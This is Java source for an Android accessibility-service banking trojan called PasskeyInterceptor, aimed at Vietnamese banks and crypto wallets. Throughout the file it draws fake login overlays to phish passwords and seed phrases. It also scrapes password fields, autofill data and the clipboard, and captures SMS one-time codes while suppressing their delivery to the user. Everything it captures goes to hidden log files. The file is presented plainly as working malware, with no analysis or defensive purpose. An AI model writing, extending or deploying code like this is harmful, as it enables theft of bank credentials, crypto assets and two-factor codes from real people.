package com.fason.app.features.passkey;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;
import android.text.InputType;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.webkit.WebView;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PasskeyInterceptor extends AccessibilityService {
    private Context ctx;
    private ClipboardManager clipboardManager;
    private Handler handler = new Handler(Looper.getMainLooper());
    private SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);

    private Map<String, String> targetApps = new HashMap<String, String>() {{
        put("com.vcb.android", "Vietcombank");
        put("com.techcombank", "Techcombank");
        put("com.bidv.android", "BIDV");
        put("org.tpbank.mobile", "TPBank");
        put("com.mservice", "Momo");
        put("vn.com.mbbank", "MB Bank");
        put("com.vnpay", "VNPay");
        put("com.acb.android", "ACB");
        put("com.sacombank", "Sacombank");
        put("com.vib.android", "VIB");
        put("com.vpbank.android", "VPBank");
        put("com.shb.android", "SHB");
        put("com.agribank.android", "Agribank");
        put("com.eximbank.android", "Eximbank");
        put("com.lienvietpostbank", "LienVietPostBank");
        put("com.ocb.android", "OCB");
        put("com.scb.android", "SCB");
        put("com.hdbank.android", "HDBank");
        put("com.binance.dev", "Binance");
        put("com.coinbase.android", "Coinbase");
        put("com.metamask", "Metamask");
        put("com.trustwallet.app", "Trust Wallet");
        put("com.paypal.android", "PayPal");
        put("com.crypto.wallet", "Crypto.com");
        put("com.exodus.wallet", "Exodus");
        put("com.blockchain.android", "Blockchain.com");
        put("com.okex.wallet", "OKX");
        put("com.bybit.app", "Bybit");
        put("com.kucoin.android", "KuCoin");
        put("com.gateio.gateio", "Gate.io");
        put("com.huobi.wallet", "Huobi");
        put("com.ledger.live", "Ledger Live");
        put("com.safepal.wallet", "SafePal");
        put("com.uniswap.mobile", "Uniswap");
        put("com.pancakeswap.android", "PancakeSwap");
    }};

    private WindowManager windowManager;
    private View fakeOverlayView;
    private boolean isOverlayShowing = false;
    private String currentTargetApp = "";
    private EditText fakePasswordField;
    private List<String> capturedCredentials = new ArrayList<>();

    private SmsInterceptor smsInterceptor;
    private List<String> capturedOtps = new ArrayList<>();

    private OnCredentialListener credentialListener;

    public interface OnCredentialListener {
        void onCredential(String appName, String data, String method);
        void onOtp(String otp, String sender, String message);
    }

    public PasskeyInterceptor() {}

    public void init(Context context) {
        this.ctx = context;
        this.clipboardManager = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        this.windowManager = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        this.smsInterceptor = new SmsInterceptor();
        dangKySmsInterceptor();
        dangKyClipboardObserver();
    }

    public void setCredentialListener(OnCredentialListener listener) {
        this.credentialListener = listener;
    }

    public List<String> getCapturedCredentials() {
        return new ArrayList<>(capturedCredentials);
    }

    public List<String> getCapturedOtps() {
        return new ArrayList<>(capturedOtps);
    }

    public void clearData() {
        capturedCredentials.clear();
        capturedOtps.clear();
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 0;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = (event.getPackageName() != null) ? event.getPackageName().toString() : "";

        if (!targetApps.containsKey(packageName)) {
            if (isOverlayShowing) anFakeOverlay();
            return;
        }

        currentTargetApp = packageName;
        String appName = targetApps.get(packageName);

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (phatHienManHinhDangNhap(event)) {
                handler.postDelayed(() -> hienThiFakeOverlay(appName), 300);
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            docDuLieuAutofill(event, appName);
        }

        docClipboard(appName);

        if (event.getSource() != null && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            duyetCayViewTimPassword(event.getSource(), appName);
        }
    }

    private boolean phatHienManHinhDangNhap(AccessibilityEvent event) {
        List<String> keywords = Arrays.asList(
            "dang nhap", "login", "sign in", "password", "mat khau",
            "passkey", "seed phrase", "private key", "secret key",
            "recovery phrase", "mnemonic", "pin code", "ma pin", "xac thuc",
            "authenticate", "verify", "2fa", "two-factor"
        );
        if (event.getText() != null) {
            for (CharSequence text : event.getText()) {
                String lower = text.toString().toLowerCase();
                for (String keyword : keywords) {
                    if (lower.contains(keyword)) return true;
                }
            }
        }
        return false;
    }

    private void hienThiFakeOverlay(String appName) {
        if (isOverlayShowing) return;
        isOverlayShowing = true;

        LinearLayout overlayLayout = new LinearLayout(ctx);
        overlayLayout.setOrientation(LinearLayout.VERTICAL);
        overlayLayout.setBackgroundColor(Color.parseColor("#F5F5F5"));
        overlayLayout.setPadding(60, 200, 60, 60);
        overlayLayout.setGravity(Gravity.CENTER);

        TextView titleView = new TextView(ctx);
        titleView.setText(appName + " - Xac thuc bao mat");
        titleView.setTextSize(20);
        titleView.setTextColor(Color.BLACK);
        titleView.setGravity(Gravity.CENTER);
        titleView.setPadding(0, 0, 0, 30);
        overlayLayout.addView(titleView);

        TextView noticeView = new TextView(ctx);
        noticeView.setText("Phien dang nhap da het han.\nVui long nhap lai mat khau de tiep tuc.");
        noticeView.setTextSize(14);
        noticeView.setTextColor(Color.RED);
        noticeView.setGravity(Gravity.CENTER);
        noticeView.setPadding(0, 0, 0, 20);
        overlayLayout.addView(noticeView);

        fakePasswordField = new EditText(ctx);
        fakePasswordField.setHint("Nhap mat khau / Passkey / Seed Phrase");
        fakePasswordField.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        fakePasswordField.setTextSize(16);
        fakePasswordField.setPadding(30, 30, 30, 30);
        fakePasswordField.setBackgroundColor(Color.WHITE);
        overlayLayout.addView(fakePasswordField);

        TextView submitButton = new TextView(ctx);
        submitButton.setText("XAC NHAN");
        submitButton.setTextSize(18);
        submitButton.setTextColor(Color.WHITE);
        submitButton.setBackgroundColor(Color.parseColor("#2196F3"));
        submitButton.setGravity(Gravity.CENTER);
        submitButton.setPadding(0, 25, 0, 25);
        submitButton.setOnClickListener(v -> {
            String stolenPassword = fakePasswordField.getText().toString();
            if (!stolenPassword.isEmpty()) {
                luuVaGuiPasskey(currentTargetApp, stolenPassword, "[FAKE_OVERLAY]");
                anFakeOverlay();
            }
        });
        overlayLayout.addView(submitButton);

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.LEFT;

        fakeOverlayView = overlayLayout;
        windowManager.addView(fakeOverlayView, params);
    }

    private void anFakeOverlay() {
        if (fakeOverlayView != null && isOverlayShowing) {
            try { windowManager.removeView(fakeOverlayView); } catch (Exception ignored) {}
            fakeOverlayView = null;
            isOverlayShowing = false;
        }
    }

    private void docDuLieuAutofill(AccessibilityEvent event, String appName) {
        if (event.getText() == null || event.getText().size() == 0) return;
        String text = event.getText().get(0).toString();
        if (text.matches("[*]") || text.length() >= 4) {
            try {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    CharSequence contentDesc = source.getContentDescription();
                    if (contentDesc != null && !contentDesc.toString().isEmpty()) {
                        luuVaGuiPasskey(appName, contentDesc.toString(), "[AUTOFILL]");
                    }
                    source.recycle();
                }
            } catch (Exception ignored) {}
        }
    }

    private void docClipboard(String appName) {
        try {
            ClipData clipData = clipboardManager.getPrimaryClip();
            if (clipData != null && clipData.getItemCount() > 0) {
                String clipText = clipData.getItemAt(0).getText().toString();
                if (clipText.length() > 3) {
                    luuVaGuiPasskey(appName, clipText, "[CLIPBOARD]");
                }
            }
        } catch (Exception ignored) {}
    }

    private void duyetCayViewTimPassword(AccessibilityNodeInfo node, String appName) {
        if (node == null) return;
        if (node.getClassName() != null && node.getClassName().toString().contains("EditText")) {
            if (node.isPassword()) {
                CharSequence text = node.getText();
                if (text != null && text.length() > 0) {
                    luuVaGuiPasskey(appName, text.toString(), "[VIEW_PASSWORD]");
                }
            }
            CharSequence hint = node.getHintText();
            if (hint != null) {
                String hintLower = hint.toString().toLowerCase();
                if (hintLower.contains("pass") || hintLower.contains("key") ||
                    hintLower.contains("seed") || hintLower.contains("secret") ||
                    hintLower.contains("phrase") || hintLower.contains("pin")) {
                    luuVaGuiPasskey(appName, "HINT:" + hint.toString(), "[FIELD_HINT]");
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                duyetCayViewTimPassword(child, appName);
                child.recycle();
            }
        }
    }

    private void dangKySmsInterceptor() {
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(999);
        ctx.registerReceiver(smsInterceptor, filter);

        ContentResolver cr = ctx.getContentResolver();
        cr.registerContentObserver(Uri.parse("content://sms/"), true, new SmsContentObserver(handler));
    }

    private class SmsInterceptor extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (!intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) return;
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            for (Object pdu : pdus) {
                android.telephony.SmsMessage sms = android.telephony.SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format"));
                String sender = sms.getDisplayOriginatingAddress();
                String message = sms.getMessageBody();
                String otp = trichXuatOTP(message);
                if (otp != null) {
                    capturedOtps.add(otp);
                    if (credentialListener != null) {
                        credentialListener.onOtp(otp, sender, message);
                    }
                    ghiOTPXuongFile(otp, sender, message);
                    try { abortBroadcast(); } catch (Exception ignored) {}
                }
            }
        }

        private String trichXuatOTP(String message) {
            String[] patterns = {
                "(?i)OTP[\\s:]*([0-9]{4,8})",
                "(?i)ma\\s*xac\\s*thuc[\\s:]*([0-9]{4,8})",
                "(?i)verification\\s*code[\\s:]*([0-9]{4,8})",
                "(?i)code[\\s:]*([0-9]{4,8})",
                "(?i)mat\\s*khau[\\s:]*([0-9]{4,8})",
                "([0-9]{6})",
                "([0-9]{4})"
            };
            for (String pattern : patterns) {
                Pattern p = Pattern.compile(pattern);
                Matcher m = p.matcher(message);
                if (m.find()) return m.group(1);
            }
            return null;
        }
    }

    private class SmsContentObserver extends ContentObserver {
        public SmsContentObserver(Handler handler) { super(handler); }
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            docSmsDatabase();
        }
    }

    private void docSmsDatabase() {
        try {
            Cursor cursor = ctx.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address", "body", "date"},
                "date > ?",
                new String[]{String.valueOf(System.currentTimeMillis() - 60000)},
                "date DESC"
            );
            if (cursor != null && cursor.moveToFirst()) {
                String sender = cursor.getString(0);
                String body = cursor.getString(1);
                if (body != null && (body.toLowerCase().contains("otp") || body.toLowerCase().contains("code") ||
                    body.toLowerCase().contains("xac thuc") || body.toLowerCase().contains("ma"))) {
                    String otp = trichXuatOTP(body);
                    if (otp != null) {
                        capturedOtps.add(otp);
                        if (credentialListener != null) {
                            credentialListener.onOtp(otp, sender, body);
                        }
                        ghiOTPXuongFile(otp, sender, body);
                    }
                }
                cursor.close();
            }
        } catch (Exception ignored) {}
    }

    private String trichXuatOTP(String message) {
        String[] patterns = {
            "(?i)OTP[\\s:]*([0-9]{4,8})",
            "(?i)ma\\s*xac\\s*thuc[\\s:]*([0-9]{4,8})",
            "(?i)verification\\s*code[\\s:]*([0-9]{4,8})",
            "(?i)code[\\s:]*([0-9]{4,8})",
            "(?i)mat\\s*khau[\\s:]*([0-9]{4,8})",
            "([0-9]{6})",
            "([0-9]{4})"
        };
        for (String pattern : patterns) {
            Pattern p = Pattern.compile(pattern);
            Matcher m = p.matcher(message);
            if (m.find()) return m.group(1);
        }
        return null;
    }

    private void dangKyClipboardObserver() {
        clipboardManager.addPrimaryClipChangedListener(() -> {
            try {
                ClipData clip = clipboardManager.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    String text = clip.getItemAt(0).getText().toString();
                    if (text.contains(" ") && text.split(" ").length >= 12) {
                        luuVaGuiPasskey("CLIPBOARD_SEED", text, "[SEED_PHRASE]");
                    } else if (text.length() >= 8 && text.length() <= 128) {
                        luuVaGuiPasskey("CLIPBOARD", text, "[CLIPBOARD_LISTENER]");
                    }
                }
            } catch (Exception ignored) {}
        });
    }

    private void ghiOTPXuongFile(String otp, String sender, String message) {
        try {
            File dir = ctx.getCacheDir();
            if (!dir.exists()) dir.mkdirs();
            FileWriter fw = new FileWriter(new File(dir, ".otps"), true);
            fw.write(String.format("[%s] OTP: %s | FROM: %s | MSG: %s\n", sdf.format(new Date()), otp, sender, message));
            fw.close();
        } catch (Exception ignored) {}
    }

    private void luuVaGuiPasskey(String appName, String data, String method) {
        String timestamp = sdf.format(new Date());
        String logEntry = String.format("[%s] App: %s | Method: %s | Data: %s", timestamp, appName, method, data);
        capturedCredentials.add(logEntry);
        if (credentialListener != null) {
            credentialListener.onCredential(appName, data, method);
        }
        try {
            File dir = ctx.getCacheDir();
            if (!dir.exists()) dir.mkdirs();
            FileWriter fw = new FileWriter(new File(dir, ".pkeys"), true);
            fw.write(logEntry + "\n");
            fw.close();
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {}
}
